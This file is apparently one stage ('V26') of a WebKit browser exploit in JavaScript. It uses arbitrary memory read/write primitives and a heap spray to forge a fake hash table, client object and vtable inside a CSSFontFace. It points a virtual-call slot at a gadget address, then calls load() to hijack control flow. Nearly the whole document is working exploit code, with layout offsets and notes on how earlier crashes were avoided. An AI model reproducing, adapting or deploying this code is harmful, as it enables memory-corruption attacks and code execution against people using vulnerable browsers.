// V26 Patch: The Returning Dispatch - Timer Hygiene
//
// THE REVELATION (from the 1400 CSSFontFace.h member order + failure pattern):
//   Every craft that ever RETURNED from load() (V17D-A Failure, V20-ArmB
//   Success) NEVER entered setStatus(). Every craft that entered a status
//   transition CRASHED - regardless of table (null/original/mine), client,
//   or promise. setStatus(Failure) UNCONDITIONALLY calls m_timeoutTimer.stop()
//   (CSSFontFace.cpp:623-626), and if the override byte is not where we think,
//   setStatus(Loading) calls startOneShot(3s). Every prior craft had a ZEROED
//   or CORRUPTED timer -> the timer killed EVERY run since v17. The "WeakHashSet
//   cleanup hang" theory was wrong all along (no auto_continue ran in the v17
//   era, so timer crashes looked like hangs).
//
// The real layout (CSSFontFace.h declaration order + device dumps):
//   +0x48 m_sources (Vector: ptr/size/cap)
//   +0x58 m_clients (WeakHashSet: m_table@+0x58, counters@+0x60/0x64)
//   +0x68 m_wrapper, +0x82 m_status (oracle-proven), +0x90..0xBF Timer
//   Timer: vptr@+0x90, unalignedFire@+0x98, alignedFire@+0xA0,
//          m_heapItem@+0xA8, m_thread@+0xB0, closure@+0xB8
//
// V26 FIX (the half of the council's timer recipe I missed): after borrowing
// the sibling's timer bytes, NULL the heap item (+0xA8) - the sibling's live
// heap-item pointer must NOT survive the borrow. The council's safe-idle spec:
// valid vptr + valid thread + zero fire time + NULL heap item. With that,
// stop() hits its early-return (oldTime==newTime==0) and even startOneShot
// would legitimately schedule. Either way load() RETURNS.

/* ==== V26: THE RETURNING DISPATCH - TIMER HYGIENE ==== */

try{
  if(MBUF>0n&&VP>0n&&bufs&&bufs.length>0&&fbRaw&&fbRaw.length>=128&&l2raw&&l2raw.length>=128){
    var FSG=BASE+0x5B3D6B0n, NOPG=BASE+0x4001750n;
    var mIdx=-1;
    var tH=readAt(MBUF+0x48n,8); var tV=qAt(tH,0);
    if((tV>>32n)===0xAAn)mIdx=Number(tV&0xFFFFFFFFn);
    bs('V26-TAG-mIdx='+mIdx);

    if(mIdx>=0&&mIdx<32){
      var sv=new DataView(window.__v688.spray[mIdx]);
      var S=MBUF;
      var hitBuf=bufs[0][0];

      var TGT=(function(){var m=/[?&]t=(gadget|poison)/.exec(location.search);return m?m[1]:'gadget';})();
      bs('V26-MODE='+TGT);

      /* ---- STEP 1: ALL readAt FIRST ---- */
      var promiseAddr=qAt(readAt(FB+0x18n,8),0);
      bs('V26-PROMISE-ADDR='+hex(promiseAddr));
      var promiseBefore=readAt(promiseAddr,0x30);
      bs('V26-PROMISE-BEFORE='+promiseBefore);

      bs('V26-SIBLING-SCAN');
      var sib=0n, sibBk=0n;
      for(var sa=FB-0x2000n;sa<FB+0x2000n&&sib===0n;sa+=8n){
        var q0h=readAt(sa,8);
        if(qAt(q0h,0)===VP){
          var bkH=readAt(sa+0x10n,8);
          var bk=qAt(bkH,0);
          if(bk>0x1000000000n&&bk!==S&&bk!==FB&&bk!==self&&bk<0x10000000000n){sib=sa;sibBk=bk;}
        }
      }
      if(sibBk===0n){bs('V26-NO-SIBLING');verd('err','V26 no sibling');throw 'no sibling';}
      bs('V26-SIBLING='+hex(sib)+'-backing='+hex(sibBk));

      var timerH=readAt(sibBk+0x88n,0x38);
      bs('V26-TIMER-BORROWED='+timerH);

      /* ---- STEP 2: build the forge in the marker buffer S ---- */
      bs('V26-FORGE-BUILD');

      /* fake WeakPtrImpl: byte-copy of the real L2, m_ptr@+0x08 -> fake client */
      for(var ib=0;ib<0x20;ib++)sv.setUint8(ib,parseInt(l2raw.substr(ib*2,2),16));
      dvSetBig(sv,0x08,S+0x50n);

      /* table metadata at T-0x10 (T=S+0x30): {deleted=0, keyCount=1, mask=3, size=4} */
      put32(sv,0x20,0);
      put32(sv,0x24,1);
      put32(sv,0x28,3);
      put32(sv,0x2C,4);   /* shouldShrink: 1*6 < 4 = FALSE -> no shrink, no free */

      dvSetBig(sv,0x30,S);            /* bucket[0] = impl */
      dvSetBig(sv,0x38,0n);
      dvSetBig(sv,0x40,0n);
      dvSetBig(sv,0x48,0n);

      /* fake client: byte-copy of the real wrapper (fbRaw), vtable patched,
       * promise UNPATCHED (keeps the REAL live promise - the V25 fix) */
      for(var cb=0;cb<0x40;cb++)sv.setUint8(0x50+cb,parseInt(fbRaw.substr(cb*2,2),16));
      dvSetBig(sv,0x50+0x00,S+0x90n);
      var clientPromise=dvGetBig(sv,0x50+0x18);
      bs('V26-CLIENT-PROMISE='+hex(clientPromise)+(clientPromise===promiseAddr?'-IS-REAL-OK':'-MISMATCH'));

      /* fake vtable: slot3 = target */
      for(var vs=0;vs<8;vs++)dvSetBig(sv,0x90+vs*8,NOPG);
      if(TGT==='poison')dvSetBig(sv,0x90+0x18,0x4141414141414141n);
      else              dvSetBig(sv,0x90+0x18,FSG);

      bs('V26-FORGE-BUILT-T='+(S+0x30n).toString(16)+'-client='+(S+0x50n).toString(16)+'-vt='+(S+0x90n).toString(16));
      bs('V26-VERIFY-impl-m_ptr='+hex(dvGetBig(sv,0x08)));
      bs('V26-VERIFY-bucket0='+hex(dvGetBig(sv,0x30)));
      bs('V26-VERIFY-client-vt='+hex(dvGetBig(sv,0x50)));
      bs('V26-VERIFY-vt-slot3='+hex(dvGetBig(sv,0x90+0x18)));

      var preA=new Uint8Array(window.__v688.spray[mIdx].slice(0,0x100));

      /* ---- STEP 3: craft the FACE (hitBuf) - all readAt done ---- */
      bs('V26-FACE-CRAFT');
      for(var sz=0x28;sz<=0x47;sz++)hitBuf[sz]=0;      /* sources empty */
      hitBuf[0x82]=0;                                  /* status = Pending */
      hitBuf[0x83]=1;
      hitBuf[0x87]=1;                                  /* override = Block */
      for(var bl=0x84;bl<=0x89;bl++)hitBuf[bl]=1;
      for(var tb=0;tb<0x38;tb++)hitBuf[0x88+tb]=parseInt(timerH.substr(tb*2,2),16);

      /* **** THE V26 FIX: TIMER HYGIENE ****
       * Keep the borrowed vptr (+0x90) and real Thread* (+0xB0), but force
       * the council's safe-idle state: fire times zero, heap item NULL.
       * The sibling's live m_heapItem (+0xA8) must not survive the borrow -
       * stop()/startOneShot() would walk the shared timer heap with a
       * stale item. NULL heap item = stop() early-returns (oldTime==newTime==0). */
      for(var hz=0x98;hz<0xA8;hz++)hitBuf[hz]=0;        /* fire times = 0 */
      for(var hz2=0xA8;hz2<0xB0;hz2++)hitBuf[hz2]=0;    /* m_heapItem = NULL */
      bs('V26-TIMER-HYGIENE-vptr='+hitBuf.slice(0x90,0x98).map(function(x){return x.toString(16);}).join(',')+'-thread='+hitBuf.slice(0xB0,0xB8).map(function(x){return x.toString(16);}).join(',')+'-heapItem=NULL');

      bs('V26-FACE-VERIFY-status='+hitBuf[0x82]+'-override='+hitBuf[0x87]);

      /* ---- STEP 4: install the table pointer - the LAST write ---- */
      for(var hb=0;hb<8;hb++)hitBuf[0x58+hb]=Number(((S+0x30n)>>BigInt(hb*8))&0xFFn);
      bs('V26-INSTALLED-tblPtr='+hex(S+0x30n));

      /* ---- STEP 5: THE DISPATCH ---- */
      bs('V26-LOAD-PRE');
      var loadReturned=false;
      try{
        faces[zi].load();
        loadReturned=true;
        bs('V26-LOAD-RETURNED');
      }catch(e){
        bs('V26-LOAD-THREW-'+String(e&&e.message?e.message:'?'));
      }

      bs('V26-POST-returned='+loadReturned);
      bs('V26-STATUS-AFTER='+hitBuf[0x82]);
      try{bs('V26-JS-STATUS='+faces[zi].status);}catch(e){bs('V26-JS-STATUS-ERR');}

      /* ---- STEP 6: THE WITNESS - re-read the real promise ---- */
      var promiseAfter=readAt(promiseAddr,0x30);
      bs('V26-PROMISE-AFTER='+promiseAfter);
      if(promiseAfter!==promiseBefore){
        bs('WIT-V26-PROMISE-CHANGED-fontStateChanged-EXECUTED');
      }else{
        bs('WIT-V26-PROMISE-UNCHANGED');
      }

      var curA=new Uint8Array(window.__v688.spray[mIdx].slice(0,0x100));
      var diffs=[];
      for(var wq=0;wq<0x100;wq+=8){
        var cur=0n,old=0n;
        for(var wb=0;wb<8;wb++){
          cur|=BigInt(curA[wq+wb])<<BigInt(wb*8);
          old|=BigInt(preA[wq+wb])<<BigInt(wb*8);
        }
        if(cur!==old)diffs.push('@'+(S+BigInt(wq)).toString(16)+':'+old.toString(16)+'>'+cur.toString(16));
      }
      if(diffs.length)bs('WIT-V26-FORGE-WRITE-'+diffs.slice(0,10).join('|'));
      else bs('WIT-V26-FORGE-nowrite');

      /* restore */
      for(var rb=0;rb<8;rb++)hitBuf[0x58+rb]=Number((L1>>BigInt(rb*8))&0xFFn);
      bs('V26-RESTORED');

      if(loadReturned){
        verd('ok','V26 '+TGT+' load() RETURNED - DISPATCH SURVIVED');
        bs('V26-DONE-'+TGT+'-RETURNED');
      }else{
        verd('err','V26 '+TGT+' crashed');
        bs('V26-DONE-'+TGT+'-CRASHED');
      }

    }else bs('V26-SKIP-bad-idx');
  }else bs('V26-SKIP-missing-data');
}catch(e26){bs('V26-ERR-'+String(e26&&e26.message?e26.message:'?'));}
/* ==== V26 END ==== */
